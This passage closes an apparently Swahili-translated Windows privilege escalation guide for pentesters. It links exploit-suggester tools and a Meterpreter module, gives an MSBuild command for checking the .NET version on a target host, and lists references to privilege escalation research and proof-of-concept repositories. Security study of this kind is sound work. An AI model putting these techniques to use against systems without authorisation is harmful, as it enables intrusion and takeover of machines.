[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Zana iliyoundwa kutokana na chapisho hili (haihitaji accesschk ili kufanya kazi vizuri, lakini inaweza kuitumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (Python ya local)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (Python ya local)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Lazima ucompile mradi kwa kutumia toleo sahihi la .NET ([angalia hapa](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona toleo la .NET lililosakinishwa kwenye host ya mwathiriwa, unaweza kufanya hivi:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Misingi ya Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Kuongeza privileges kwa kutumia vibaya ruhusa dhaifu za folda](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - mwongozo wa haraka](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Warsha ya Windows / Linux Local Privilege Escalation](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Mashambulizi ya Windows: AT ndiyo mtindo mpya (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Mwongozo kamili wa OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Mwongozo wa Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Orodha hakiki ya Windows-Privilege-Escalation](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Mbinu za Windows Privilege Escalation kwa Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing ya Word VBA macro kupitia SMTP → decryption ya credentials za hMailServer → Veeam CVE-2023-27532 hadi SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: format-string leak + stack BOF → VirtualAlloc ROP (RCE) na wizi wa kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Kumfuatilia Silver Fox: Paka na Panya katika Vivuli vya Kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Athari ya mfumo wa faili wenye privileges katika mfumo wa SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Zana za Kujaribu Symbolic Link – matumizi ya CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Kiungo cha Zamani. Kutumia vibaya Symbolic Links kwenye Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (toleo la Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Utatuzi hatari wa modules kwenye Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modules: kupakia kutoka kwenye folders za `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Changamoto za checklist ya C/C++, zimetatuliwa](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Kazi ya RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own na Microslop: Kuunganisha CLDFLT na hali za mbio za DirectX Kernel kwa Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [I/O Ring Moja Kuwatawala Wote: Primitive kamili ya exploit ya Read/Write kwenye Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Kutumia vibaya ufutaji wa faili kiholela ili kuongeza privileges na mbinu nyingine bora](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - code ya exploit ya FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Mashambulizi ya WSUS Sehemu ya 2: CVE-2020-1013, Windows 10 Local Privilege Escalation ya siku moja](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Kuchunguza Credential Manager na Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Mabadiliko ya picha yanaposababisha Privilege Escalation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Kutoa SSH Private Keys kutoka kwa SSH Agent ya Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Kubadilisha seva za update za enterprise kuwa viwanda vya backdoor (0_o) – Sehemu ya 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Kubadilisha seva za update za enterprise kuwa viwanda vya backdoor (0_o) – Sehemu ya 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Windows Installer Folder Delete Privilege Escalation](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: Kufuatilia tena hatua zako hadi NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
{{#include ../../banners/hacktricks-training.md}}
